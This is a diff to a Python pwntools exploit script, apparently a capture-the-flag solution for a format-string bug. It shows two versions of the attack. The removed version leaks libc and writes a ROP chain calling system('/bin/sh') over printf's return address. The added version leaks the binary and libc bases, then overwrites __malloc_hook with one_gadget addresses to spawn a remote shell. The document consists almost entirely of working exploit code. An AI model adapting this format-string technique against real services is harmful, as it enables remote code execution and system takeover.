@@ -38,44 +38,44 @@ def conn():
 
 
 def main():
-    r = conn()
+    # ogs are found by `one_gadget libc.so.6`. It turns out that only the last two work.
+    ogs = [0x4f2be, 0x4f2c5, 0x4f322, 0x10a38c]
+    for og in ogs:
+        r = conn()
 
-    STRING_OFFSET = 6  # Determined by "AAAAAAAA|%1$p...|%40$p". Rest offsets are from debugging.
-    MAIN_RBP_OFFSET = 40
-    # ECHO_RET_OFFSET = 41
-    MAIN_RET_OFFSET = 45
-    PRINTF_RET_STACK_OFFSET = 0x138
+        # FSB to leak binary base addr/libc function addr/libc base addr + libc identification + FSB writes + __malloc_hook
 
-    r.sendline(f'%{MAIN_RBP_OFFSET}$p'.encode())
-    main_rbp = int(r.recvline(), 16)
-    info(f'main() rbp is {hex(main_rbp)}')
-    printf_ret_stack_addr = main_rbp - PRINTF_RET_STACK_OFFSET
-    info(f'printf return address is on stack {hex(printf_ret_stack_addr)}')
+        STRING_OFFSET = 6  # Determined by "AAAAAAAA|%1$p...|%40$p". Rest offsets are from debugging.
+        ECHO_RET_OFFSET = 41
+        ECHO_RET_MAIN_OFFSET = 0x2f
 
-    r.sendline(f'%{MAIN_RET_OFFSET}$p'.encode())
-    main_ret = int(r.recvline(), 16)
-    # Used this info to locate the libc version from https://libc.rip
-    info(f'main() ret address in __libc_start_main is {hex(main_ret)}')
-    libc_main_start = main_ret - 0xe7   # from debugging with the right libc version
-    info(f'__libc_start_main is at {hex(libc_main_start)}')
-    libc.address = libc_main_start - libc.sym.__libc_start_main
-    info(f'libc base address is {hex(libc.address)}')
+        r.sendline(f'%{ECHO_RET_OFFSET}$p'.encode())
+        echo_ret = int(r.recvline(), 16)
+        info(f'echo()\'s ret addr is {hex(echo_ret)}')
+        main_addr = echo_ret - ECHO_RET_MAIN_OFFSET
+        main_offset = e.sym.main - e.address
+        e.address = main_addr - main_offset
+        info(f'binary base is at {hex(e.address)}')
 
-    rop = ROP(libc)
-    rop.raw(next(libc.search(asm('ret'))))
-    rop.system(next(libc.search(b'/bin/sh')))
-    info(rop.dump())
-    rop_chain = rop.chain()
-    info(f'rop chain has length {len(rop_chain)}')
-    payload = fmtstr_payload(offset=STRING_OFFSET, writes={
-        printf_ret_stack_addr:  rop_chain,
-        }, write_size='short')
-    info(f'FSB payload has length {len(payload)}, must be smaller than 255')
+        r.sendline(f'%{STRING_OFFSET + 1}$s'.encode() + b'\x00' * 4 + p64(e.got.printf))
+        printf_addr = u64(r.recvn(6) + b'\x00' * 2)
+        info(f'printf is at {hex(printf_addr)}')    # This can help identify the libc version
+        printf_offset = libc.sym.printf - libc.address
+        libc.address = printf_addr - printf_offset
+        info(f'libc base address is {hex(libc.address)}')
 
-    r.sendline(payload)
-    r.clean(timeout=2)
-
-    r.interactive()
+        payload = fmtstr_payload(offset=STRING_OFFSET, writes={
+            libc.sym.__malloc_hook: libc.address + og,
+            })
+        info(f'FSB payload has length {len(payload)}, must be smaller than 255')
+        r.sendline(payload)
+        r.sendline(b'%100000d')  # To trigger the malloc()
+        r.clean(timeout=2)
+        sleep(1)    # Need sleep() to wait the tube to end.
+        if r.connected():
+            r.interactive()
+        else:
+            r.close()
 
 if __name__ == "__main__":
     main()
